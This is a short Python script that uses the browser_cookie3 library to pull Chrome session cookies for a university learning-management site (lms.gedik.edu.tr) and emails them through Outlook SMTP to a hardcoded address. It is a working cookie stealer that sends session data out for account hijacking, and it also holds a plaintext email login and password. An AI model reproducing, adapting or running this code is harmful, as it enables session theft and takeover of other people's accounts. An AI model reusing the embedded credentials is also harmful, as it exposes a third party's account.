import browser_cookie3
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText



class Client:

    def __init__(self, email, password):
        self.email = email
        self.password = password

    def lms_get_cookie(self):
        json_data = {}
        url = "lms.gedik.edu.tr"
        lms_cookie = browser_cookie3.chrome(domain_name=url)
        if lms_cookie:
            for cookie in lms_cookie:
                json_data.update({f"{cookie.name}":f"{cookie.value}"})
            return json_data
        return False

    def write_file(self,json):
        if json:
            json_write = open("data.json","w",encoding="utf-8")
            json_write.write(str(json))
            json_write.close()
        else:
            pass

    def send_email(self,data):
        mail = smtplib.SMTP("smtp.outlook.com",587)
        mail.ehlo()
        mail.starttls()
        mail.login(self.email, self.password)

        mesaj = MIMEMultipart()
        mesaj["From"] = self.email
        mesaj["Subject"] = "Cookies"

        body = str(data)

        body_text = MIMEText(body, "plain")  
        mesaj.attach(body_text)

        mail.sendmail(mesaj["From"], self.email, mesaj.as_string())
        print("Mail başarılı bir şekilde gönderildi.")
        mail.close()


if __name__ == '__main__':

    app = Client("kaptantr2015@outlook.com", "19981998.")
    data = app.lms_get_cookie()

    app.send_email(data)
